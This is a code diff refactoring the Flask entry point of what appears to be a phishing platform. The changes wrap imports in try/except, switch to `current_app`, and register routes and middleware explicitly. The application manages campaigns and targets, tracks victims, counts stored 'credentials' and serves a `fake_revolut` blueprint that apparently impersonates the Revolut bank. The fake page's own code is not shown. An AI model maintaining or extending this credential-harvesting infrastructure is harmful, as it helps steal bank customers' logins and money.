@@ -8,7 +8,7 @@ import os
 import sys
 import logging
 from datetime import datetime
-from flask import Flask, render_template, jsonify, request, redirect, url_for
+from flask import Flask, render_template, jsonify, request, redirect, url_for, current_app
 
 # Add project root to Python path
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
@@ -27,12 +27,35 @@ from models.tracking import Tracking
 from models.credential import Credential
 
 # Import route blueprints
-from routes.campaigns import bp as campaigns_bp
-from routes.dashboard import bp as dashboard_bp
-from routes.targets import bp as targets_bp
-from routes.templates import bp as templates_bp
-from routes.webhook import bp as webhook_bp
-from routes.fake_revolut import bp as fake_revolut_bp
+try:
+    from routes.campaigns import bp as campaigns_bp
+except ImportError:
+    campaigns_bp = None
+    
+try:
+    from routes.dashboard import bp as dashboard_bp
+except ImportError:
+    dashboard_bp = None
+    
+try:
+    from routes.targets import bp as targets_bp
+except ImportError:
+    targets_bp = None
+    
+try:
+    from routes.templates import bp as templates_bp
+except ImportError:
+    templates_bp = None
+    
+try:
+    from routes.webhook import bp as webhook_bp
+except ImportError:
+    webhook_bp = None
+    
+try:
+    from routes.fake_revolut import bp as fake_revolut_bp
+except ImportError:
+    fake_revolut_bp = None
 
 # Import services
 from services.campaign_service import CampaignService
@@ -232,18 +255,17 @@ def register_cli_commands(app):
 
 # ===== ROUTE-URI PRINCIPALE =====
 
-@app.route('/')
 def index():
     """Pagina principală - redirectează la dashboard"""
     return redirect(url_for('dashboard.index'))
 
 
-@app.route('/health')
 def health_check():
     """Health check endpoint pentru monitoring"""
     try:
         # Verifică conexiunea la baza de date
-        db.session.execute('SELECT 1')
+        from sqlalchemy import text
+        db.session.execute(text('SELECT 1'))
         
         # Statistici rapide
         total_campaigns = Campaign.query.count()
@@ -253,10 +275,10 @@ def health_check():
             'timestamp': datetime.utcnow().isoformat(),
             'database': 'connected',
             'total_campaigns': total_campaigns,
-            'version': app.config.get('APP_VERSION', '1.0.0')
+            'version': current_app.config.get('APP_VERSION', '1.0.0')
         })
     except Exception as e:
-        app.logger.error(f"Health check failed: {str(e)}")
+        current_app.logger.error(f"Health check failed: {str(e)}")
         return jsonify({
             'status': 'unhealthy',
             'timestamp': datetime.utcnow().isoformat(),
@@ -264,7 +286,6 @@ def health_check():
         }), 500
 
 
-@app.route('/api/stats')
 def api_stats():
     """API endpoint pentru statistici generale"""
     try:
@@ -280,7 +301,7 @@ def api_stats():
                 'credentials': Credential.query.count()
             },
             'system_info': {
-                'version': app.config.get('APP_VERSION', '1.0.0'),
+                'version': current_app.config.get('APP_VERSION', '1.0.0'),
                 'environment': os.environ.get('FLASK_ENV', 'development'),
                 'uptime': 'Not implemented'  # TODO: implementează uptime tracking
             }
@@ -288,18 +309,17 @@ def api_stats():
         
         return jsonify(stats)
     except Exception as e:
-        app.logger.error(f"Error getting API stats: {str(e)}")
+        current_app.logger.error(f"Error getting API stats: {str(e)}")
         return jsonify({'error': 'Failed to get statistics'}), 500
 
 
 # ===== MIDDLEWARE =====
 
-@app.before_request
 def before_request():
     """Se execută înainte de fiecare request"""
     # Log request-urile importante
     if not request.path.startswith('/static/'):
-        app.logger.debug(f"Request: {request.method} {request.path} from {get_client_ip()}")
+        current_app.logger.debug(f"Request: {request.method} {request.path} from {get_client_ip()}")
     
     # Setează header-e de securitate
     if request.endpoint and request.endpoint.startswith('fake_revolut'):
@@ -310,7 +330,6 @@ def before_request():
         pass
 
 
-@app.after_request
 def after_request(response):
     """Se execută după fiecare request"""
     # Adaugă header-e de securitate pentru admin panel
@@ -332,6 +351,10 @@ def after_request(response):
 
 # Creează aplicația
 app = create_app()
+
+# Înregistrează middleware-ul
+app.before_request(before_request)
+app.after_request(after_request)
 
 # Înregistrează route-urile principale (pentru compatibilitate cu blueprint-urile)
 app.add_url_rule('/', 'index', index)
